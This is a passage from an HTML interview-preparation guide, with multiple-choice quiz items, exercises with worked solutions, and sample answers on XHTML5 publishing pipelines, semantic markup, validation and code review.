3. The best way to handle a question you cannot answer is to…
- [ ] Guess confidently
- [x] State what you know, what you would check, and where
- [ ] Change the subject
> Interviewers test honesty and problem-solving, not omniscience.

4. Which of these is a void element?
- [ ] `<p>`
- [x] `<input>`
- [ ] `<span>`
> `input`, `img`, `br`, `hr`, `meta` and `link` have no closing tag.

### Exercises

1. **Two-minute answer** — Write, in under 120 words, your answer to "How would you build one HTML source that outputs a website, a PDF and an EPUB?"
<details><summary>Solution</summary>

Write polyglot XHTML5: lowercase closed tags, quoted attributes, numeric entities, one h1 with an unbroken heading outline and stable ids. Keep semantics in the markup and looks in CSS split by media: a screen stylesheet, a print stylesheet with `@page` rules for WeasyPrint, and a reader-safe stylesheet for EPUB. Generate from one Jinja2 template with autoescaping. Serve the HTML as the website; run WeasyPrint for the PDF, which gives bookmarks from the headings; run Pandoc to EPUB3 and validate with epubcheck. The heading ids double as anchors, PDF bookmarks and the EPUB nav. The trade-off is that you cannot use browser-only features such as scripts in content, so interactivity lives in a separate layer.

</details>

2. **Spot the weak answer** — "I use `<div>` for everything because it is flexible." Rewrite this as a strong answer.
<details><summary>Solution</summary>

"I reach for the semantic element first: `nav`, `main`, `article`, `section`, `button`, because they give accessibility landmarks, SEO signals and keyboard behaviour for free. `div` is right when the box has no meaning, such as a layout wrapper, and I have no problem using it there. On a recent report site that discipline cut the axe violations from 23 to 2 without adding any ARIA."

</details>

### Interview Questions

**Q: Tell me about a time bad HTML caused a real problem and how you fixed it.**
A client's 400-page EPUB failed Amazon KDP upload with 300+ epubcheck errors after a Word export. The causes were named entities (`&nbsp;`), unclosed `<br>` tags and `<div>` elements nested inside `<p>`. Rather than hand-fix, I rebuilt the pipeline: cleaned the Word styles, exported with Pandoc to XHTML, post-processed entities with a Python script, and added epubcheck to the build. The first regenerated file passed with zero errors and the client received the book the same day. The lesson I share is that HTML's forgiveness hides errors until a strict consumer meets them, so validation belongs in the process, not at the end.

**Q: What is the difference between HTML, XHTML and HTML5, and when would you use each?**
HTML5 is the current living standard with a forgiving, fully specified parser and the modern element set. XHTML is HTML expressed in XML syntax: closed tags, lowercase, quoted attributes, escaped ampersands, parsed strictly with no recovery. "XHTML5" is HTML5's vocabulary in XML syntax, which is what EPUB3 requires. I write HTML5 for websites because browsers handle it and it is shorter; I write XHTML5 (polyglot where possible) for EPUB and for any pipeline that uses XML tools such as lxml, XSLT or strict validators. The trade-off is discipline versus tolerance, and a generator should always err on the strict side because strict output is also valid loose input.

**Q: How do you keep up with changes in HTML?**
HTML is a living standard maintained by WHATWG, so I follow the spec's changelog, MDN's "Browser compatibility" tables and the Chrome, Firefox and WebKit release notes for interop status. Recent additions I have adopted are `<dialog>`, `popover`, declarative shadow DOM, `loading="lazy"` on iframes, `fetchpriority` and `:user-invalid`. I check caniuse before using anything in client work, and I keep a personal test page for features I rely on in WeasyPrint, since a PDF engine lags the browsers by a year or more. Saying what you adopted recently and what you deliberately have not yet is a stronger answer than listing everything new.

**Q: How would you review a junior developer's HTML?**
I start with the automated checks: the W3C validator (or `html-validate` in CI), Lighthouse accessibility and axe, and epubcheck if the output feeds an ebook. Then I read for semantics: one h1, correct heading order, landmarks, real buttons and links, labels on every control, alt text with meaning. Then structure: no layout tables, no inline styles except in email, no inline event handlers. I leave comments that explain why, link to MDN, and ask them to fix one category at a time so the pattern sticks. Finally I check that the page works with a keyboard alone, which catches most of what tools miss.

**Q: What would you change about HTML if you could?**
Interviewers ask this to see whether you understand the design constraints. I would like a way to declare that a document should be parsed strictly, giving developers XML-style errors during development while users keep the forgiving parser; today that is a linter's job. I would also standardise a native sanitiser API sooner so `innerHTML` stops being the default XSS sink, and improve form styling so custom selects are not needed. What I would not change is backward compatibility: the fact that a 1995 page still renders is the platform's greatest feature, and every proposal has to respect that.

